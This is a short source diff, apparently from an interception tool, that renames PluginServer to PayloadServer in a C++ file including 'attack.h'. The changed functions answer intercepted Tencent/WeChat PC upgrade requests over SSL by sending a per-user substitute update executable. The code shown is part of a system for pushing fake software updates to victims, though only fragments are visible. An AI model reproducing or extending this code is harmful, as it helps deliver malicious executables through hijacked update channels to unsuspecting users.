@@ -5,7 +5,7 @@
 #include "../attack.h"
 #include "sslPublic.h"
 #include "../HttpUtils.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int gQQvideoType = 0;
 
@@ -229,7 +229,7 @@ int QQVideoSSL::replyTencentPcUpgrade(char*recvBuffer, int len, int buflimit, LP
 
 	string filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
 
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 	return 0;
 }
 
@@ -238,7 +238,7 @@ int QQVideoSSL::replyTencentPcUpgrade(char*recvBuffer, int len, int buflimit, LP
 
 	string filename = Public::getUserUrl(pstSSLProxyParam->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
 
-	int ret = PluginServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), pstSSLProxyParam, szHttpRespFormat, 1);
 	return 0;
 }
 
